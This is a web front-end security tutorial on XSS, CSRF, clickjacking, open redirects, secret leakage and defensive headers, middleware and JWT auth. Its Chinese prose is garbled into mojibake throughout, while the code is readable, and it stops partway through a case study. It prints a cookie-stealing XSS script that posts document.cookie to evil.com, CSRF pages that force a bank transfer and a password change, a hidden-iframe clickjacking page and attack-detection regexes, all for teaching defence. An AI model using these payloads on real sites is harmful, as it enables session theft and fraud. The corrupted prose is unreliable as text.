# å‰ç«¯å®‰å…¨æ·±åº¦è§£æ ğŸ›¡ï¸

## ğŸ¯ æ–‡æ¡£æ¦‚è¿°

å‰ç«¯å®‰å…¨æ˜¯Webåº”ç”¨å®‰å…¨çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚æœ¬æ–‡æ¡£æ·±å…¥è§£æå¸¸è§çš„å‰ç«¯å®‰å…¨æ¼æ´ï¼ŒåŒ…æ‹¬XSSã€CSRFç­‰æ”»å‡»æ–¹å¼çš„åŸç†ã€å±å®³åŠé˜²å¾¡ç­–ç•¥ï¼Œå¸®åŠ©å¼€å‘è€…æ„å»ºæ›´å®‰å…¨çš„Webåº”ç”¨ã€‚

## ğŸ“‹ ç›®å½•

1. [XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰æ·±åº¦è§£æ](#xss)
2. [CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ·±åº¦è§£æ](#csrf)
3. [å…¶ä»–é‡è¦å®‰å…¨æ¼æ´](#other-vulnerabilities)
4. [å®‰å…¨é˜²å¾¡æœ€ä½³å®è·µ](#best-practices)
5. [å®æˆ˜æ¡ˆä¾‹åˆ†æ](#case-studies)
6. [å®‰å…¨æ£€æŸ¥æ¸…å•](#security-checklist)

---

## ğŸš¨ XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰æ·±åº¦è§£æ {#xss}

### ä»€ä¹ˆæ˜¯XSSæ”»å‡»ï¼Ÿ

XSSï¼ˆCross-Site Scriptingï¼‰æ˜¯ä¸€ç§ä»£ç æ³¨å…¥æ”»å‡»ï¼Œæ”»å‡»è€…é€šè¿‡åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ³¨å…¥æ¶æ„è„šæœ¬ï¼Œä½¿ä¹‹åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šè¿è¡Œã€‚å½“ç”¨æˆ·æµè§ˆè¢«æ„ŸæŸ“çš„é¡µé¢æ—¶ï¼ŒåµŒå…¥å…¶ä¸­çš„æ¶æ„è„šæœ¬å°±ä¼šè¢«æ‰§è¡Œã€‚

### XSSæ”»å‡»åˆ†ç±»

#### 1. å­˜å‚¨å‹XSSï¼ˆStored XSSï¼‰

**åŸç†**ï¼šæ¶æ„è„šæœ¬æ°¸ä¹…å­˜å‚¨åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼ˆå¦‚æ•°æ®åº“ã€æ¶ˆæ¯è®ºå›ã€è®¿å®¢ç•™è¨€æ¿ç­‰ï¼‰

**æ”»å‡»æµç¨‹**ï¼š
```
æ”»å‡»è€… â†’ æäº¤æ¶æ„è„šæœ¬åˆ°æœåŠ¡å™¨ â†’ æœåŠ¡å™¨å­˜å‚¨ â†’ ç”¨æˆ·è®¿é—®é¡µé¢ â†’ æ¶æ„è„šæœ¬æ‰§è¡Œ
```

**å±é™©ä»£ç ç¤ºä¾‹**ï¼š
```javascript
// ç”¨æˆ·è¯„è®ºåŠŸèƒ½ - å­˜åœ¨XSSæ¼æ´
function displayComment(comment) {
  document.getElementById('comments').innerHTML +=
    `<div class="comment">${comment}</div>`;
}

// æ”»å‡»è€…æäº¤çš„æ¶æ„è¯„è®º
const maliciousComment = `
  <script>
    // çªƒå–ç”¨æˆ·Cookie
    fetch('http://evil.com/steal', {
      method: 'POST',
      body: document.cookie
    });
  </script>
`;
```

**æ”»å‡»æ•ˆæœ**ï¼š
- çªƒå–ç”¨æˆ·Cookieå’ŒSession
- é‡å®šå‘åˆ°æ¶æ„ç½‘ç«™
- åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡Œæ“ä½œ

#### 2. åå°„å‹XSSï¼ˆReflected XSSï¼‰

**åŸç†**ï¼šæ¶æ„è„šæœ¬é€šè¿‡URLå‚æ•°ä¼ é€’ï¼ŒæœåŠ¡å™¨å°†å…¶ç›´æ¥åå°„åˆ°é¡µé¢ä¸­

**æ”»å‡»ç¤ºä¾‹**ï¼š
```html
<!-- æœç´¢é¡µé¢ - å­˜åœ¨åå°„å‹XSS -->
<form action="/search" method="GET">
  <input type="text" name="q" placeholder="è¾“å…¥æœç´¢å…³é”®è¯">
  <button type="submit">æœç´¢</button>
</form>

<!-- æœåŠ¡å™¨ç›´æ¥è¾“å‡ºæœç´¢å…³é”®è¯ï¼Œæœªç»è¿‡æ»¤ -->
<div>æœç´¢ç»“æœï¼š{{query}}</div>
```

**æ¶æ„URL**ï¼š
```
http://vulnerable-site.com/search?q=<script>alert('XSS')</script>
```

#### 3. DOMå‹XSS

**åŸç†**ï¼šé€šè¿‡ä¿®æ”¹é¡µé¢çš„DOMç¯å¢ƒåœ¨æœ¬åœ°æ‰§è¡Œæ¶æ„è„šæœ¬

**æ¼æ´ä»£ç ç¤ºä¾‹**ï¼š
```javascript
// è¯»å–URLå‚æ•°å¹¶ç›´æ¥å†™å…¥DOM
function getUrlParam(name) {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(name);
}

// å±é™©ï¼šç›´æ¥ä½¿ç”¨innerHTML
document.getElementById('welcome').innerHTML =
  'æ¬¢è¿ ' + getUrlParam('name');
```

**æ”»å‡»URL**ï¼š
```
http://site.com/page?name=<img src=x onerror=alert('DOM XSS')>
```

### XSSæ”»å‡»çš„å±å®³

1. **Cookieçªƒå–**ï¼šè·å–ç”¨æˆ·èº«ä»½è®¤è¯ä¿¡æ¯
2. **ä¼šè¯åŠ«æŒ**ï¼šå†’å……ç”¨æˆ·èº«ä»½è¿›è¡Œæ“ä½œ
3. **ç½‘ç»œé’“é±¼**ï¼šé‡å®šå‘åˆ°ä¼ªé€ é¡µé¢éª—å–ä¿¡æ¯
4. **æ¶æ„æ“ä½œ**ï¼šä»£æ›¿ç”¨æˆ·æ‰§è¡Œæ•æ„Ÿæ“ä½œ
5. **ä¿¡æ¯æ³„éœ²**ï¼šè®¿é—®ç”¨æˆ·éšç§æ•°æ®

### XSSé˜²å¾¡ç­–ç•¥

#### 1. è¾“å…¥éªŒè¯å’Œè¿‡æ»¤

```javascript
// è¾“å…¥éªŒè¯å‡½æ•°
function validateInput(input) {
  // ç§»é™¤å±é™©å­—ç¬¦
  const dangerous = /<script|javascript:|on\w+\s*=/gi;
  return input.replace(dangerous, '');
}

// æ›´ä¸¥æ ¼çš„ç™½åå•è¿‡æ»¤
function sanitizeInput(input) {
  const allowedTags = ['b', 'i', 'u', 'em', 'strong'];
  const allowedAttrs = ['class', 'id'];

  // ä½¿ç”¨DOMPurifyåº“è¿›è¡Œå®‰å…¨è¿‡æ»¤
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: allowedTags,
    ALLOWED_ATTR: allowedAttrs
  });
}
```

#### 2. è¾“å‡ºç¼–ç 

```javascript
// HTMLå®ä½“ç¼–ç 
function htmlEncode(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// å®‰å…¨çš„DOMæ“ä½œ
function safeSetContent(element, content) {
  // ä½¿ç”¨textContentè€Œä¸æ˜¯innerHTML
  element.textContent = content;
}

// Reactä¸­çš„å®‰å…¨å®è·µ
function SafeComponent({ userInput }) {
  return (
    <div>
      {/* Reactè‡ªåŠ¨è¿›è¡ŒHTMLè½¬ä¹‰ */}
      <p>{userInput}</p>

      {/* å±é™©ï¼šä½¿ç”¨dangerouslySetInnerHTML */}
      <div dangerouslySetInnerHTML={{__html: userInput}} />

      {/* å®‰å…¨ï¼šå…ˆè¿›è¡Œæ¸…ç† */}
      <div dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(userInput)
      }} />
    </div>
  );
}
```

#### 3. å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰

```html
<!-- CSPå¤´éƒ¨è®¾ç½® -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'unsafe-inline' https://trusted-cdn.com;
               style-src 'self' 'unsafe-inline';
               img-src 'self' data: https:;">
```

```javascript
// æœåŠ¡å™¨ç«¯è®¾ç½®CSP
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'nonce-${nonce}'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "connect-src 'self' https://api.trusted.com"
  ].join('; '));
  next();
});
```

#### 4. HttpOnly Cookie

```javascript
// è®¾ç½®HttpOnly Cookieé˜²æ­¢XSSçªƒå–
res.cookie('sessionId', sessionId, {
  httpOnly: true,    // é˜²æ­¢JavaScriptè®¿é—®
  secure: true,      // åªåœ¨HTTPSä¸‹ä¼ è¾“
  sameSite: 'strict' // é˜²æ­¢CSRFæ”»å‡»
});
```

---

## ğŸ”’ CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ·±åº¦è§£æ {#csrf}

### ä»€ä¹ˆæ˜¯CSRFæ”»å‡»ï¼Ÿ

CSRFï¼ˆCross-Site Request Forgeryï¼‰æ˜¯ä¸€ç§åŠ«æŒç”¨æˆ·å·²è®¤è¯çš„ä¼šè¯ï¼Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œä»¥ç”¨æˆ·çš„èº«ä»½å‘ç›®æ ‡ç½‘ç«™å‘é€æ¶æ„è¯·æ±‚çš„æ”»å‡»æ–¹å¼ã€‚

### CSRFæ”»å‡»åŸç†

```
1. ç”¨æˆ·ç™»å½•å—ä¿¡ä»»ç½‘ç«™Aï¼Œç”ŸæˆCookie
2. ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™Bï¼ˆæœªé€€å‡ºç½‘ç«™Aï¼‰
3. æ¶æ„ç½‘ç«™Bå‘ç½‘ç«™Aå‘é€è¯·æ±‚
4. æµè§ˆå™¨è‡ªåŠ¨æºå¸¦ç½‘ç«™Açš„Cookie
5. ç½‘ç«™Aæ”¶åˆ°è¯·æ±‚ï¼Œè¯¯ä»¥ä¸ºæ˜¯ç”¨æˆ·çš„æ­£å¸¸æ“ä½œ
```

### CSRFæ”»å‡»ç¤ºä¾‹

#### 1. GETè¯·æ±‚æ”»å‡»

**ç›®æ ‡ç½‘ç«™è½¬è´¦æ¥å£**ï¼š
```javascript
// é“¶è¡Œè½¬è´¦APIï¼ˆå­˜åœ¨CSRFæ¼æ´ï¼‰
app.get('/transfer', (req, res) => {
  const { to, amount } = req.query;
  const user = req.session.user; // ä»sessionè·å–ç”¨æˆ·ä¿¡æ¯

  if (user) {
    // æ‰§è¡Œè½¬è´¦æ“ä½œ
    transferMoney(user.account, to, amount);
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'æœªç™»å½•' });
  }
});
```

**æ¶æ„ç½‘ç«™çš„æ”»å‡»ä»£ç **ï¼š
```html
<!-- æ¶æ„ç½‘ç«™é¡µé¢ -->
<img src="http://bank.com/transfer?to=attacker&amount=10000"
     style="display:none">

<!-- æˆ–è€…ä½¿ç”¨JavaScriptè‡ªåŠ¨å‘é€è¯·æ±‚ -->
<script>
  // ç”¨æˆ·è®¿é—®é¡µé¢æ—¶è‡ªåŠ¨æ‰§è¡Œè½¬è´¦
  fetch('http://bank.com/transfer?to=attacker&amount=10000', {
    credentials: 'include' // åŒ…å«Cookie
  });
</script>
```

#### 2. POSTè¯·æ±‚æ”»å‡»

**ç›®æ ‡ç½‘ç«™æ¥å£**ï¼š
```javascript
// ä¿®æ”¹å¯†ç API
app.post('/change-password', (req, res) => {
  const { newPassword } = req.body;
  const user = req.session.user;

  if (user) {
    updatePassword(user.id, newPassword);
    res.json({ success: true });
  }
});
```

**æ¶æ„ç½‘ç«™æ”»å‡»**ï¼š
```html
<!-- è‡ªåŠ¨æäº¤çš„è¡¨å• -->
<form id="maliciousForm" action="http://bank.com/change-password" method="POST">
  <input type="hidden" name="newPassword" value="hacked123">
</form>

<script>
  // é¡µé¢åŠ è½½æ—¶è‡ªåŠ¨æäº¤è¡¨å•
  document.getElementById('maliciousForm').submit();
</script>
```

### CSRFé˜²å¾¡ç­–ç•¥

#### 1. CSRF TokenéªŒè¯

```javascript
// ç”ŸæˆCSRF Token
const crypto = require('crypto');

function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

// åœ¨ç”¨æˆ·ç™»å½•æ—¶ç”ŸæˆToken
app.post('/login', (req, res) => {
  // éªŒè¯ç”¨æˆ·å‡­æ®...
  const csrfToken = generateCSRFToken();
  req.session.csrfToken = csrfToken;

  res.json({
    success: true,
    csrfToken: csrfToken
  });
});

// éªŒè¯CSRF Tokençš„ä¸­é—´ä»¶
function validateCSRFToken(req, res, next) {
  const token = req.headers['x-csrf-token'] || req.body.csrfToken;

  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF TokenéªŒè¯å¤±è´¥' });
  }

  next();
}

// åœ¨æ•æ„Ÿæ“ä½œä¸­ä½¿ç”¨CSRFä¿æŠ¤
app.post('/transfer', validateCSRFToken, (req, res) => {
  // æ‰§è¡Œè½¬è´¦æ“ä½œ
});
```

**å‰ç«¯å®ç°**ï¼š
```javascript
// è·å–CSRF Token
let csrfToken = '';

fetch('/api/csrf-token')
  .then(response => response.json())
  .then(data => {
    csrfToken = data.token;
  });

// åœ¨è¯·æ±‚ä¸­åŒ…å«CSRF Token
function secureRequest(url, data) {
  return fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify(data),
    credentials: 'include'
  });
}

// è¡¨å•ä¸­åŒ…å«éšè—çš„CSRF Token
function addCSRFTokenToForm(form) {
  const input = document.createElement('input');
  input.type = 'hidden';
  input.name = 'csrfToken';
  input.value = csrfToken;
  form.appendChild(input);
}
```

#### 2. SameSite Cookieå±æ€§

```javascript
// è®¾ç½®SameSiteå±æ€§
app.use(session({
  cookie: {
    sameSite: 'strict', // ä¸¥æ ¼æ¨¡å¼ï¼Œè·¨ç«™è¯·æ±‚ä¸ä¼šå‘é€Cookie
    // sameSite: 'lax',  // å®½æ¾æ¨¡å¼ï¼ŒæŸäº›è·¨ç«™å¯¼èˆªä¼šå‘é€Cookie
    secure: true,        // åªåœ¨HTTPSä¸‹ä¼ è¾“
    httpOnly: true       // é˜²æ­¢XSSæ”»å‡»
  }
}));

// ä¸åŒSameSiteå€¼çš„å¯¹æ¯”
const cookieOptions = {
  // strict: å®Œå…¨ç¦æ­¢è·¨ç«™è¯·æ±‚æºå¸¦Cookie
  sameSite: 'strict',

  // lax: å…è®¸å®‰å…¨çš„è·¨ç«™å¯¼èˆªï¼ˆå¦‚é“¾æ¥ç‚¹å‡»ï¼‰æºå¸¦Cookie
  sameSite: 'lax',

  // none: å…è®¸æ‰€æœ‰è·¨ç«™è¯·æ±‚æºå¸¦Cookieï¼ˆéœ€è¦secure=trueï¼‰
  sameSite: 'none',
  secure: true
};
```

#### 3. éªŒè¯Refererå¤´

```javascript
// RefereréªŒè¯ä¸­é—´ä»¶
function validateReferer(req, res, next) {
  const referer = req.get('Referer');
  const host = req.get('Host');

  if (!referer || !referer.includes(host)) {
    return res.status(403).json({
      error: 'è¯·æ±‚æ¥æºéªŒè¯å¤±è´¥'
    });
  }

  next();
}

// ä½¿ç”¨RefereréªŒè¯
app.post('/sensitive-action', validateReferer, (req, res) => {
  // æ‰§è¡Œæ•æ„Ÿæ“ä½œ
});
```

#### 4. åŒé‡CookieéªŒè¯

```javascript
// åŒé‡CookieéªŒè¯
function doubleCookieCSRF(req, res, next) {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRFéªŒè¯å¤±è´¥' });
  }

  next();
}

// è®¾ç½®CSRF Cookie
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = generateCSRFToken();
    res.cookie('csrfToken', token, {
      httpOnly: false, // å…è®¸JavaScriptè¯»å–
      sameSite: 'strict'
    });
  }
  next();
});
```

---

## âš ï¸ å…¶ä»–é‡è¦å®‰å…¨æ¼æ´ {#other-vulnerabilities}

### 1. ç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰

**æ”»å‡»åŸç†**ï¼šé€šè¿‡iframeå°†ç›®æ ‡ç½‘ç«™åµŒå…¥åˆ°æ¶æ„ç½‘ç«™ä¸­ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»

**æ”»å‡»ç¤ºä¾‹**ï¼š
```html
<!-- æ¶æ„ç½‘ç«™é¡µé¢ -->
<style>
  iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0; /* é€æ˜iframe */
    z-index: 999;
  }

  .fake-button {
    position: absolute;
    top: 100px;
    left: 100px;
    width: 200px;
    height: 50px;
    background: red;
    color: white;
  }
</style>

<div class="fake-button">ç‚¹å‡»é¢†å–å¥–å“</div>
<iframe src="http://bank.com/transfer-page"></iframe>
```

**é˜²å¾¡ç­–ç•¥**ï¼š
```javascript
// 1. X-Frame-Optionså¤´
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY'); // ç¦æ­¢è¢«iframeåµŒå…¥
  // res.setHeader('X-Frame-Options', 'SAMEORIGIN'); // åªå…è®¸åŒæºåµŒå…¥
  next();
});

// 2. Content-Security-Policy
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
  next();
});

// 3. JavaScriptæ£€æµ‹æ¡†æ¶åµŒå…¥
if (window.top !== window.self) {
  // é¡µé¢è¢«åµŒå…¥iframeä¸­
  window.top.location = window.self.location;
}
```

### 2. å¼€æ”¾é‡å®šå‘æ¼æ´

**æ¼æ´ä»£ç **ï¼š
```javascript
// å±é™©ï¼šç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥è¿›è¡Œé‡å®šå‘
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  res.redirect(url); // å¯èƒ½é‡å®šå‘åˆ°æ¶æ„ç½‘ç«™
});
```

**é˜²å¾¡æªæ–½**ï¼š
```javascript
// å®‰å…¨çš„é‡å®šå‘å®ç°
const allowedDomains = ['trusted1.com', 'trusted2.com'];

function safeRedirect(req, res) {
  const url = req.query.url;

  // 1. éªŒè¯URLæ ¼å¼
  let parsedUrl;
  try {
    parsedUrl = new URL(url);
  } catch (e) {
    return res.status(400).json({ error: 'æ— æ•ˆURL' });
  }

  // 2. æ£€æŸ¥åŸŸåç™½åå•
  if (!allowedDomains.includes(parsedUrl.hostname)) {
    return res.status(403).json({ error: 'ä¸å…è®¸çš„é‡å®šå‘åŸŸå' });
  }

  // 3. å®‰å…¨é‡å®šå‘
  res.redirect(url);
}
```

### 3. æ•æ„Ÿä¿¡æ¯æ³„éœ²

**å¸¸è§æ³„éœ²ç‚¹**ï¼š
```javascript
// 1. å®¢æˆ·ç«¯æš´éœ²æ•æ„Ÿé…ç½®
const config = {
  apiKey: 'secret-api-key', // å±é™©ï¼šAPIå¯†é’¥æš´éœ²
  dbPassword: 'db-password' // å±é™©ï¼šæ•°æ®åº“å¯†ç æš´éœ²
};

// 2. æ§åˆ¶å°è¾“å‡ºæ•æ„Ÿä¿¡æ¯
console.log('ç”¨æˆ·å¯†ç ï¼š', password); // å±é™©

// 3. é”™è¯¯ä¿¡æ¯æ³„éœ²
app.use((err, req, res, next) => {
  // å±é™©ï¼šå°†è¯¦ç»†é”™è¯¯ä¿¡æ¯è¿”å›ç»™å®¢æˆ·ç«¯
  res.status(500).json({
    error: err.message,
    stack: err.stack // æ³„éœ²æœåŠ¡å™¨å†…éƒ¨ä¿¡æ¯
  });
});
```

**å®‰å…¨å®è·µ**ï¼š
```javascript
// 1. ç¯å¢ƒå˜é‡é…ç½®
const config = {
  apiKey: process.env.API_KEY, // ä»ç¯å¢ƒå˜é‡è¯»å–
  production: process.env.NODE_ENV === 'production'
};

// 2. ç”Ÿäº§ç¯å¢ƒç¦ç”¨console
if (config.production) {
  console.log = console.warn = console.error = () => {};
}

// 3. å®‰å…¨çš„é”™è¯¯å¤„ç†
app.use((err, req, res, next) => {
  // è®°å½•è¯¦ç»†é”™è¯¯åˆ°æ—¥å¿—
  logger.error(err.stack);

  // åªè¿”å›å®‰å…¨çš„é”™è¯¯ä¿¡æ¯
  res.status(500).json({
    error: config.production ? 'æœåŠ¡å™¨å†…éƒ¨é”™è¯¯' : err.message
  });
});

// 4. ä»£ç æ··æ·†å’Œå‹ç¼©
// ä½¿ç”¨webpackã€rollupç­‰å·¥å…·è¿›è¡Œä»£ç æ··æ·†
```

### 4. ä¸å®‰å…¨çš„ä¾èµ–

**æ£€æµ‹å’Œé˜²æŠ¤**ï¼š
```bash
# ä½¿ç”¨npm auditæ£€æŸ¥æ¼æ´
npm audit

# è‡ªåŠ¨ä¿®å¤å·²çŸ¥æ¼æ´
npm audit fix

# æ£€æŸ¥è¿‡æ—¶çš„ä¾èµ–
npm outdated

# ä½¿ç”¨yarnæ£€æŸ¥
yarn audit
```

```javascript
// package.jsonä¸­å›ºå®šç‰ˆæœ¬
{
  "dependencies": {
    "express": "4.18.2", // å›ºå®šç‰ˆæœ¬è€Œä¸æ˜¯^4.18.2
    "lodash": "4.17.21"
  }
}

// ä½¿ç”¨Snykç­‰å·¥å…·æŒç»­ç›‘æ§
// åœ¨CI/CDä¸­é›†æˆå®‰å…¨æ£€æŸ¥
```

---

## ğŸ›¡ï¸ å®‰å…¨é˜²å¾¡æœ€ä½³å®è·µ {#best-practices}

### 1. å®‰å…¨ç¼–ç è§„èŒƒ

```javascript
// 1. è¾“å…¥éªŒè¯
function validateUserInput(input) {
  // ç±»å‹æ£€æŸ¥
  if (typeof input !== 'string') {
    throw new Error('è¾“å…¥å¿…é¡»æ˜¯å­—ç¬¦ä¸²');
  }

  // é•¿åº¦é™åˆ¶
  if (input.length > 1000) {
    throw new Error('è¾“å…¥è¿‡é•¿');
  }

  // å†…å®¹éªŒè¯
  const dangerousPatterns = [
    /<script/i,
    /javascript:/i,
    /on\w+\s*=/i
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(input)) {
      throw new Error('è¾“å…¥åŒ…å«å±é™©å†…å®¹');
    }
  }

  return true;
}

// 2. å®‰å…¨çš„æ•°æ®åº“æŸ¥è¯¢
const mysql = require('mysql2');

// å±é™©ï¼šSQLæ³¨å…¥é£é™©
function unsafeQuery(userId) {
  const query = `SELECT * FROM users WHERE id = ${userId}`;
  return db.query(query);
}

// å®‰å…¨ï¼šä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢
function safeQuery(userId) {
  const query = 'SELECT * FROM users WHERE id = ?';
  return db.query(query, [userId]);
}

// 3. å®‰å…¨çš„æ–‡ä»¶æ“ä½œ
const path = require('path');

function safeFileAccess(filename) {
  // é˜²æ­¢è·¯å¾„éå†æ”»å‡»
  const safePath = path.join('/safe/directory', filename);

  // ç¡®ä¿æ–‡ä»¶åœ¨å®‰å…¨ç›®å½•å†…
  if (!safePath.startsWith('/safe/directory/')) {
    throw new Error('ä¸å®‰å…¨çš„æ–‡ä»¶è·¯å¾„');
  }

  return safePath;
}
```

### 2. å®‰å…¨å¤´éƒ¨è®¾ç½®

```javascript
// å®Œæ•´çš„å®‰å…¨å¤´éƒ¨é…ç½®
app.use((req, res, next) => {
  // é˜²æ­¢ç‚¹å‡»åŠ«æŒ
  res.setHeader('X-Frame-Options', 'DENY');

  // é˜²æ­¢MIMEç±»å‹å—…æ¢
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // XSSä¿æŠ¤
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // å¼ºåˆ¶HTTPS
  res.setHeader('Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload');

  // æ§åˆ¶å¼•ç”¨è€…ä¿¡æ¯
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  // æƒé™ç­–ç•¥
  res.setHeader('Permissions-Policy',
    'geolocation=(), microphone=(), camera=()');

  // å†…å®¹å®‰å…¨ç­–ç•¥
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "connect-src 'self' https://api.example.com",
    "font-src 'self' https://fonts.googleapis.com",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'"
  ].join('; '));

  next();
});
```

### 3. èº«ä»½è®¤è¯å’Œæˆæƒ

```javascript
// JWTå®‰å…¨å®ç°
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

class AuthService {
  // å¯†ç åŠ å¯†
  static async hashPassword(password) {
    const saltRounds = 12; // æ›´é«˜çš„å¤æ‚åº¦
    return await bcrypt.hash(password, saltRounds);
  }

  // å¯†ç éªŒè¯
  static async verifyPassword(password, hash) {
    return await bcrypt.compare(password, hash);
  }

  // ç”ŸæˆJWT
  static generateToken(user) {
    const payload = {
      id: user.id,
      email: user.email,
      role: user.role
    };

    return jwt.sign(payload, process.env.JWT_SECRET, {
      expiresIn: '1h', // çŸ­æœŸè¿‡æœŸ
      issuer: 'your-app',
      audience: 'your-app-users'
    });
  }

  // éªŒè¯JWT
  static verifyToken(token) {
    try {
      return jwt.verify(token, process.env.JWT_SECRET);
    } catch (error) {
      throw new Error('æ— æ•ˆçš„token');
    }
  }
}

// æƒé™éªŒè¯ä¸­é—´ä»¶
function requireRole(requiredRole) {
  return (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];

    if (!token) {
      return res.status(401).json({ error: 'ç¼ºå°‘è®¤è¯token' });
    }

    try {
      const decoded = AuthService.verifyToken(token);

      if (decoded.role !== requiredRole) {
        return res.status(403).json({ error: 'æƒé™ä¸è¶³' });
      }

      req.user = decoded;
      next();
    } catch (error) {
      return res.status(401).json({ error: 'æ— æ•ˆçš„token' });
    }
  };
}
```

### 4. å®‰å…¨ç›‘æ§å’Œæ—¥å¿—

```javascript
// å®‰å…¨äº‹ä»¶ç›‘æ§
class SecurityMonitor {
  static logSecurityEvent(type, details, req) {
    const event = {
      timestamp: new Date().toISOString(),
      type: type,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      details: details
    };

    // è®°å½•åˆ°å®‰å…¨æ—¥å¿—
    logger.warn('SECURITY_EVENT', event);

    // ä¸¥é‡äº‹ä»¶ç«‹å³å‘Šè­¦
    if (type === 'POTENTIAL_ATTACK') {
      this.alertSecurityTeam(event);
    }
  }

  static alertSecurityTeam(event) {
    // å‘é€å‘Šè­¦é€šçŸ¥
    // å¯ä»¥é›†æˆé‚®ä»¶ã€çŸ­ä¿¡ã€Slackç­‰
  }
}

// æ”»å‡»æ£€æµ‹ä¸­é—´ä»¶
function detectAttacks(req, res, next) {
  const suspiciousPatterns = [
    /<script/i,
    /union\s+select/i,
    /\b(and|or)\b.*\b(sleep|benchmark)\b/i
  ];

  const userInput = JSON.stringify(req.query) + JSON.stringify(req.body);

  for (const pattern of suspiciousPatterns) {
    if (pattern.test(userInput)) {
      SecurityMonitor.logSecurityEvent('POTENTIAL_ATTACK', {
        pattern: pattern.toString(),
        input: userInput
      }, req);

      return res.status(400).json({ error: 'è¯·æ±‚è¢«æ‹’ç»' });
    }
  }

  next();
}

// è¯·æ±‚é™åˆ¶
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15åˆ†é’Ÿ
  max: 100, // é™åˆ¶æ¯ä¸ªIPåœ¨15åˆ†é’Ÿå†…æœ€å¤š100ä¸ªè¯·æ±‚
  message: 'è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•',
  standardHeaders: true,
  legacyHeaders: false
});

app.use('/api', limiter);
```

---

## ğŸ“Š å®æˆ˜æ¡ˆä¾‹åˆ†æ {#case-studies}

### æ¡ˆä¾‹1ï¼šç”µå•†ç½‘ç«™XSSæ”»å‡»é˜²æŠ¤

**åœºæ™¯**ï¼šç”¨æˆ·è¯„è®ºåŠŸèƒ½å­˜åœ¨XSSæ¼æ´

**æ¼æ´ä»£ç **ï¼š
```javascript
// å­˜åœ¨æ¼æ´çš„è¯„è®ºç³»ç»Ÿ
app.post('/api/comments', (req, res) => {
  const { productId, comment } = req.body;

  // ç›´æ¥å­˜å‚¨ç”¨æˆ·è¾“å…¥ï¼Œæœªè¿›è¡Œè¿‡æ»¤
  const newComment = {
    id: generateId(),
    productId,
    comment, // å±é™©ï¼šæœªè¿‡æ»¤çš„ç”¨æˆ·è¾“å…¥
    createdAt: new Date()
  };

  db.comments.push(newComment);
  res.json({ success: true });
});

// å‰ç«¯æ˜¾ç¤ºè¯„è®º
function displayComments(comments) {
  const container = document.getElementById('comments');
  container.innerHTML = comments.map(comment => `
    <div class="comment">
      <p>${comment.comment}</p> <!-- å±é™©ï¼šç›´æ¥è¾“å‡ºHTML -->
      <span>${comment.createdAt}</span>
    </div>
  `).join('');
}
```

**ä¿®å¤æ–¹æ¡ˆ**ï¼š
```javascript
// æœåŠ¡å™¨ç«¯å®‰å…¨å¤„ç†
const DOMPurify = require('isomorphic-dompurify');

app.post('/api/comments', (req, res) => {
  const { productId, comment } = req.body;

  // 1. è¾“å…¥éªŒè¯
  if (!comment || comment.length > 500) {
    return res.status(400).json({ error: 'è¯„è®ºå†…å®¹æ— æ•ˆ' });
  }

  // 2. HTMLæ¸…ç†
  const sanitizedComment = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });

  const newComment = {
    id: generateId(),
    productId,
    comment: sanitizedComment,
    createdAt: new Date()
  };

  db.comments.push(newComment);
  res.json({ success: true });
});

